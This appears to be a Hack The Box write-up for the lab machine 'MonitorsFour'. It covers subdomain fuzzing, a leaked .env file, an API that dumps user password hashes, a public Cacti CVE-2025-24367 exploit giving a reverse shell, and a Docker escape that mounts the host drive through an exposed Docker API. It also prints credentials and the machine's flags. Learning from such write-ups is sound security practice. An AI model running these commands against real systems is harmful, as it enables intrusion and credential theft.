---
title: "MonitorsFour"
date: 2026-05-28
slug: monitorsfour
tags: [hackthebox, windows, web, privesc]
difficulty: Medium
---
h
A writeup for the CTF MonitorsFour - {[MonitorsFour](https://app.hackthebox.com/machines/MonitorsFour)}

---

# Reconnaissance

```
 @dedfish  rustscan -a 10.129.28.29 -- -sC -sV

Open 10.129.28.29:80
Open 10.129.28.29:5985

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack nginx
| http-methods: 
|_  Supported Methods: GET
|_http-favicon: Unknown favicon MD5: 889DCABDC39A9126364F6A675AA4167D
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MonitorsFour - Networking Solutions
5985/tcp open  http    syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


```

port 80 is open and i can see a very basic webapp with nothing much to it only a login page which i could try to brute force **if i know any usernames** on the system 
![[Pasted image 20260502165343.png]]

port 5985 is windows remote manager which is windows version of SSH 
which means if I find any valid windows user on this server then i can get remote access using evil-winrm


searching for virtual subdomains :
```
ffuf -w ~/wind/ctf/wordlist/Subdomain.txt \
     -u http://monitorsfour.htb \
     -H "Host: FUZZ.monitorsfour.htb" \
     -fs 138 \
     -s \
     -o results.json \
     -of json 
     
     
cacti
```
we get cacti.monitorsfour.htb
after adding that to /etc/hosts 

![[Pasted image 20260502213234.png]]
cacti is a network monitoring platform which used for authentication of users here using the similar passwords can work

---

#  Findings(credentials, services, vulnerabilities)

doing dir scan we found /.env exists the following are contents of .env 
```
cat env 
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```


going to http://monitorsfour.htb/user 
gives error as  "missing token parameter"
so we will pass a random token parameter 
using `http://monitorsfour.htb/user?token=0` gives us
```
[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super 
user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},

{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},

{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},

{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
```

using hash crackers online to convert "password":"56b32eb43e6f15395f6c46c1c9e1cd36"
we get password as `wondrful1`
using 
`admin : wonderful1
 we access to admin account where we have a lot more to explore other functionalities 

using the same creds in cacti login page gives us nothing but using 
`marcus : wonderful1` gives us access to cacti login page 

version for cacti is : **Version 1.2.28**
this version is vulnerable to **CVE-2025–24367** 




---

# Exploitation


using https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC 

running and executing the exploit 
```
 @dedfish  sudo python3 exploit.py \
  -u marcus \
  -p wonderful1 \
  -i 10.10.16.201 \
  -l 1337 \
  -url http://cacti.monitorsfour.htb
[sudo] password for dedfish: 
[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: zPMMs.php
[+] Got payload: /bash
[i] Created PHP filename: YdcnB.php
[+] Hit timeout, looks good for shell, check your listener!
[+] Stopped HTTP server on port 80
```

setting up a listner 

```
 @dedfish  nc -lnvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.28.29 58324
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$ 
```

got the user flag 
```
www-data@821fbd6a43fa:/$ cd home
cd home
www-data@821fbd6a43fa:/home$ ls
ls
marcus
www-data@821fbd6a43fa:/home$ cd marcus
cd marcus
www-data@821fbd6a43fa:/home/marcus$ ls
ls
user.txt
www-data@821fbd6a43fa:/home/marcus$ cat user.txt
cat user.txt
a893bdc5b48d8f3f2a3c18182942977a
```



---

# Privilege Escalation


this is a docker machine we can say that by the hostname of the machine 

```
www-data@821fbd6a43fa:/home/marcus$ ip a 
ip a 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo 
       valid_lft forever preferred_lft forever
2: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether be:04:98:57:c4:14 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
       
       
       
www-data@821fbd6a43fa:/home/marcus$ ip route
ip route
default via 172.18.0.1 dev eth0 
172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 
```

to escape the docker environment we can check if Docker Engine API default port is exposed by doing 

```
curl -v http://host.docker.internal:2375/version


<s$ curl -v http://host.docker.internal:2375/version
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host host.docker.internal:2375 was resolved.
* IPv6: fdc4:f303:9324::254
* IPv4: 192.168.65.254
*   Trying [fdc4:f303:9324::254]:2375...
* Immediate connect fail for fdc4:f303:9324::254: Network is unreachable
*   Trying 192.168.65.254:2375...
* connect to 192.168.65.254 port 2375 from 172.18.0.2 port 41708 failed: Connection refused
* Failed to connect to host.docker.internal port 2375 after 100 ms: Could not connect to server
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
* closing connection #0
curl: (7) Failed to connect to host.docker.internal port 2375 after 100 ms: Could not connect to server
```

this was unable to connect but we got that it was after performing scan on the 192.168.65.0/24 subnet
```
set +m; for i in {1..254}; do (curl -s --connect-timeout 1 "<http://192.168.65.$i:2375/version>" 2>/dev/null | grep -q "ApiVersion" && echo "192.168.65.$i:2375 OPEN") & done; wait
```
we found that `http://192.168.65.7:2375` is responding 

```
[254] 1238
www-data@821fbd6a43fa:/home/marcus$ curl httpcurl -v 
< 
{ [859 bytes data]
100   852    0   852    0     0  38489      0 --:--:-- --:--:-- --:--:-- 38727
* Connection #1 to host 192.168.65.7 left intact
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"28.3.2","Details":{"ApiVersion":"1.51","Arch":"amd64","BuildTime":"2025-07-09T16:13:55.000000000+00:00","Experimental":"false","GitCommit":"e77ff99","GoVersion":"go1.24.5","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","MinAPIVersion":"1.24","Os":"linux"}},{"Name":"containerd","Version":"1.7.27","Details":{"GitCommit":"05044ec0a9a75232cad458027ca83437aae3f4da"}},{"Name":"runc","Version":"1.2.5","Details":{"GitCommit":"v1.2.5-0-g59923ef"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"28.3.2","ApiVersion":"1.51","MinAPIVersion":"1.24","GitCommit":"e77ff99","GoVersion":"go1.24.5","Os":"linux","Arch":"amd64","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","BuildTime":"2025-07-09T16:13:55.000000000+00:00"}
www-data@821fbd6a43fa:/home/marcus$ 
```

script to make a new container and mount the root files to that container and read the root file to do a privilege escalation 


```

 @dedfish  cat container.json 
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}

```

send this file to the target server using python server 

```


www-data@821fbd6a43fa:~/html/cacti$ curl http://10.10.16.201:8000/container.json -o /tmp/container.json   

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   221  100   221    0     0    416      0 --:--:-- --:--:-- --:--:--   416



www-data@821fbd6a43fa:~/html/cacti$ curl -X POST -H "Content-Type: application/json" -d @/tmp/container.json http://192.168.65.7:2375/containers/create?name=pwneda


  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   300    0    88  100   212    407    981 --:--:-- --:--:-- --:--:--  1395
{"Id":"ba1dcec3617ba34e953fb354338d29ab5fafe5d143b5a2c2ca1278e0313beaf9","Warnings":[]}


www-data@821fbd6a43fa:~/html/cacti$ curl -X POST http://192.168.65.7:2375/containers/pwneda/start

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0


www-data@821fbd6a43fa:~/html/cacti$ curl "http://192.168.65.7:2375/containers/pwneda/logs?stdout=true&stderr=true"

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    35    0    35    0     0   2992      0 --:--:-- --:--:-- --:--:--  3181
285deaca25e25a159e5994618798acba

```

285deaca25e25a159e5994618798acba - root flag 


---

# mistakes and learning 

1. learning all the different types of privilege escalation is the key here we needed to come out of the docker machine which was very difficult method and very less techniques on the internet showing how this is possible 
2. network concepts and different methodologies of recon are yet to be explored
